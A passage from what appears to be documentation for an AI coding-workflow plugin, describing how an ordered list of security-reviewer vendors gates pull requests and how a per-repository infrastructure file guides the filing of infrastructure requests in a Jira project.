  against the requirements in the Critics table above. Any other vendor stops the run.
- **The last entry is the floor and must name `claude`.** It is the only vendor that needs nothing
  installed, so it is the only one that can be relied on to run. A list ending in any other vendor has no floor, and `/review-pr` stops rather
  than discovering it halfway down the chain.
- **The order is the repo's choice.** `/setup-workflow` writes the same default order as Critics,
  for a new file and when it adds the list to an existing file that lacks it. It never reorders a
  list that is already there.

**A missing list means the Claude floor runs.** `/review-pr` does not borrow the Critics list in its
place: it runs the Claude floor on its own session's model, and says once that
`/setup-workflow` adds the list.

**What the entry reviews, and how its findings gate.** Every entry, whatever its vendor, gets the
same prompt: `references/security-review-prompt.md`, which is Anthropic's Claude Code security
review (MIT) adapted only so that codex, google and claude can all run it. It reviews the PR's diff
against its base at the head commit the code reviewer reviews, read-only, at the same time as the
code reviewer, and reports only vulnerabilities with real exploitation potential, each graded High,
Medium or Low with a `path:line` and an exploit scenario. A High finding blocks, exactly as a
code-reviewer Critical or High does: the PR stays a draft. Medium and Low are listed and never block.
An entry that returns no graded result is skipped by the chain-walking rules, and when no entry
produces one, `/review-pr` stops and the PR stays a draft.

`/review-pr` reads the list through `scripts/security-reviewers.py`, which holds the rules above
that a file can break.

Written by `/setup-workflow`. The Critics list is read by `/critique-spec` and by nothing else; the
Security reviewers list by `/review-pr` and by nothing else; the Specs line by `/dispatch-slices`,
`/acceptance-tests` and `/finalize-pr`. Changing any of them is an edit to this file and not a
release of the plugin. There is no mode line here: a repository
that keeps Specs cannot choose which of its gates block.

Nothing in this file is loaded into a session's context. Each line is read on demand by the skills
that need it.

## The per-repo infrastructure file

```
docs/agents/infrastructure.md
```

Beside `workflow.md`. It tells `/create-infra-request` where an Infrastructure request goes and what
one looks like, for the infrastructure this repository uses and does not own. Free prose under four
headings, because what it records differs too much between organisations for a fixed grammar:

```markdown
## Where requests go

Jira, project `PE` (Platform Engineering) on gr4vy.atlassian.net, issue type Task. Priority High
when something deployed is already broken without it, Medium otherwise.

## What a request looks like

- PE-1682: one change, with Summary, Context, Acceptance criteria and Other information
- PE-1740: several changes for one Spec, as numbered parts

## Where the infrastructure is declared

| Resource | Declared in | Live state |
| --- | --- | --- |
| The ledger table | `gr4vy/terraform-gcp`, `gr4vy-data-be6c/.../terragrunt.hcl` | `bq show --schema ...` |

## What is dangerous here

The ledger leaf sets `deletion_protection = false`, so a plan that replaces the table drops it.
```

- **Where requests go** names the tracker, the project and the issue type, and how a priority is
  chosen. `/create-infra-request` creates nothing in a tracker this section does not name.
- **What a request looks like** names example requests the owning team has already accepted. They
  are the format: their sections, their titles, their length. The skill reads them rather than
  carrying a template of its own, so a team that changes its format changes these lines, not the
  plugin.
- **Where the infrastructure is declared** maps each resource the repository depends on to the file
  that declares it and the read-only command that shows its live state.
- **What is dangerous here** is what the owning team would want a requester to know before writing
  one: a resource without deletion protection, a policy whose absence nothing reports.

Written by hand, with the user, the first time `/create-infra-request` runs in a repository without
it. Read by `/create-infra-request` and by nothing else. **No file means no request:** the skill
stops rather than guessing a tracker, because a request in the wrong place is one nobody plans.
